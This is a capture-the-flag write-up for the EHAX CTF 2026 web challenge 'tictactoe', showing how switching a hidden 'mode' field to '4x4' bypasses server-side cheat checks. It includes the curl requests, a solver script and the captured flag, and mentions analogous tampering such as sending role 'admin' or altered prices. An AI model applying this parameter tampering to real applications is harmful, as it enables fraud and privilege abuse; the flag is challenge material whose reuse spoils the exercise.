---
title: "[Web] tictactoe"
description: Writeup for "tictactoe" from EHAX CTF 2026.
date: 2026-03-01 09:00:00 +0900
categories: [CTF, EHAX CTF 2026]
tags: [Web]
toc: true
comments: false
---

# tictactoe (EHAX CTF 2026)

---

- **Name:** tictactoe
- **Category:** Web
- **Description:** The NEURAL-LINK CORE v4.4 is online, and its logic is absolute. If you want the flag, you'll have to break the protocol, not just the game.
- **Difficulty:** ★★☆☆☆

---

## TL;DR

The game sends board state directly to the server via a POST API.
The server checks for cheating in `3x3` mode — but completely skips validation in `4x4` mode.
Send a full-X board using `mode: "4x4"` and get the flag.

---

## Overview

We are given a Tic-Tac-Toe game hosted at:
`https://ctf-challenge-1-beige.vercel.app/`

The description says:

> "The NEURAL-LINK CORE v4.4 is online, and its logic is absolute.
> If you want the flag, you'll have to **break the protocol**, not just the game."

The key phrase is **"break the protocol"** — this tells us the goal is not to win the game normally, but to manipulate how the game communicates with the server.

---

<img width="2028" height="1647" alt="스크린샷 2026-03-01 063657" src="https://github.com/user-attachments/assets/86e559f4-d257-4a81-9c8c-97e49ca8158e" />

---

## Solution

### 1) Recon

First, open DevTools (F12) → Network tab and play one move.
You'll see a POST request going to `/api`.

Then, check the page source to find JavaScript files:

```bash
curl -s https://ctf-challenge-1-beige.vercel.app/ | grep -oP 'src="[^"]*"'
# Output: src="script.js"
```

Read `script.js`:

```bash
curl -s https://ctf-challenge-1-beige.vercel.app/script.js
```

Inside, the key function is:

```js
async function syncWithCore() {
    const response = await fetch('/api', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ mode: "3x3", state: board })
    });
    const data = await response.json();

    if (data.flag) {
        // Show the flag on screen!
        status.innerHTML = `...${data.flag}...`;
    }
}
```

**What we learned:**

- The API endpoint is `POST /api`
- It sends `{ mode: "3x3", state: board }` where `board` is a 3×3 array
  - `1` = player (X)
  - `-1` = AI (O)
  - `0` = empty
- If the server returns `data.flag`, it gets shown on screen
- **The client controls what board state gets sent — no protection on the client side**

---

### 2) Root Cause

Try sending a winning board directly:

```bash
curl -s -X POST https://ctf-challenge-1-beige.vercel.app/api \
  -H "Content-Type: application/json" \
  -d '{"mode":"3x3","state":[[1,1,1],[0,-1,0],[-1,0,0]]}'
```

Response:
```json
{
  "message": "AI: I've simulated this 3x3 grid 10^6 times. You don't win in any of them.",
  "ai_move": 3
}
```

The server **detects the cheating** in `3x3` mode and ignores the win.

When the board is full (DRAW), the server replies:

```json
{
  "message": "AI: DRAW... Perhaps you should inspect the headers of your reality.",
  "gameOver": true
}
```

The hint — **"inspect the headers of your reality"** — points toward something about how the request is structured. After trying HTTP headers with no luck, the focus shifts to the `mode` field in the request body.

Try different mode values:

```bash
curl -s -X POST https://ctf-challenge-1-beige.vercel.app/api \
  -H "Content-Type: application/json" \
  -d '{"mode":"4x4","state":[[1,1,1,1],[-1,-1,0,0],[0,0,0,0],[0,0,0,0]]}'
```

Response:
```json
{
  "message": "4x4_MODE_ACTIVE: AI sensors blind in ghost sectors."
}
```

**"AI sensors blind"** — the server has a `4x4` mode, and in that mode the cheat detection is turned off.

The root cause is simple:

| Mode | Cheat Detection | Board Validation |
|------|----------------|-----------------|
| `3x3` | ✅ Enabled | ✅ Checks for valid win/cheat |
| `4x4` | ❌ Disabled | ❌ No checks at all |

The developer added a secret mode but forgot to add validation logic for it.

---

### 3) Exploit

Since `4x4` mode skips all validation, send an impossible board where X fills every single cell:

```bash
curl -s -X POST https://ctf-challenge-1-beige.vercel.app/api \
  -H "Content-Type: application/json" \
  -d '{"mode":"4x4","state":[[1,1,1,1],[1,1,1,1],[1,1,1,1],[1,1,1,1]]}'
```

Response:
```json
{
  "message": "AI: Protocol bypassed... You didn't just play the game; you rewrote the rules. Respect.",
  "flag": "EH4X{D1M3NS1ONAL_GHOST_1N_TH3_SH3LL}"
}
```

Flag captured. ✅

---

### 4) Why It Works

This is a classic **server-side trust issue**.

In a normal secure application, the server should:
1. Check that the board state is actually reachable (no impossible positions)
2. Apply the same validation rules for every game mode

Here, the developer validated the `3x3` mode carefully, but introduced a hidden `4x4` mode without copying over the same checks. This is sometimes called **inconsistent input validation** — the security rules only apply to the "known" path, and any unknown path bypasses them entirely.

The game UI never exposes `4x4` mode — but since the client sends `mode` freely, and the server trusts whatever value it receives, we can reach hidden server logic just by changing one field.

This kind of vulnerability appears in real-world applications too:
- Sending `role: "admin"` in a registration request
- Changing `price: 1` when buying items
- Using hidden API parameters not shown in the UI

---

## Solver

Save as `solve.sh` and run it:

```bash
#!/bin/bash
# TICTACTOE CTF Solver
# EHAX CTF 2026

TARGET="https://ctf-challenge-1-beige.vercel.app/api"

echo "[*] Sending impossible 4x4 board..."

curl -s -X POST "$TARGET" \
  -H "Content-Type: application/json" \
  -d '{"mode":"4x4","state":[[1,1,1,1],[1,1,1,1],[1,1,1,1],[1,1,1,1]]}' \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print('[+] FLAG:', d.get('flag','Not found'))"
```

Or one-liner:

```bash
curl -s -X POST https://ctf-challenge-1-beige.vercel.app/api \
  -H "Content-Type: application/json" \
  -d '{"mode":"4x4","state":[[1,1,1,1],[1,1,1,1],[1,1,1,1],[1,1,1,1]]}' | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('flag'))"
```

**Output:**
```
EH4X{D1M3NS1ONAL_GHOST_1N_TH3_SH3LL}
```
---
<img width="2079" height="124" alt="스크린샷 2026-03-01 071002" src="https://github.com/user-attachments/assets/95f977ef-761a-45a3-9810-d785aa4400a1" />
---
